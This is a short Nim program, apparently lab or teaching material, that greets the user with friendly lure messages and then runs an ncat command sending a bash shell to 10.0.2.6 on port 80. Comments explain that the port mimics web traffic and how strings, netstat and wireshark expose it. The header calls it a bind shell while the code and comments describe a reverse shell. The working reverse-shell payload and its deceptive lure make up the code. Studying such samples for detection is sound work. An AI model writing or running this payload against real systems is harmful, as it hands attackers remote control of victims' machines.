# Basic bind shell

import osproc


echo "Wow! Thanks so much for executing this file!"

echo "You won't regret it!"

echo "Press enter for a fun word of wisdom. :)"

discard readline(stdin)

discard execCmd("ncat 10.0.2.6 80 -e /bin/bash &")


# This is an example of a very basic rev shell -
# It does nothing to hide the fact that it has shellcode calling
# an ncat binary to send a shell over the network.
# reversing its behavior is extremely easy with a simple 
# strings bindShell | grep bash
# pointing you directly to the shellcode.
# As a network analyst, running netstat on your endpoint will clue you in to an
# errant ncat connection as well.
# Note that it is a bit sneakier than the bindshell- there's no listener on the target
# When the payload isn't running.
# Also, you will notice we can make the connection look like an innocuous "web" connection
# by reaching out to a common port like 80.
# Lets see what we find in wireshark though, when we sniff traffic!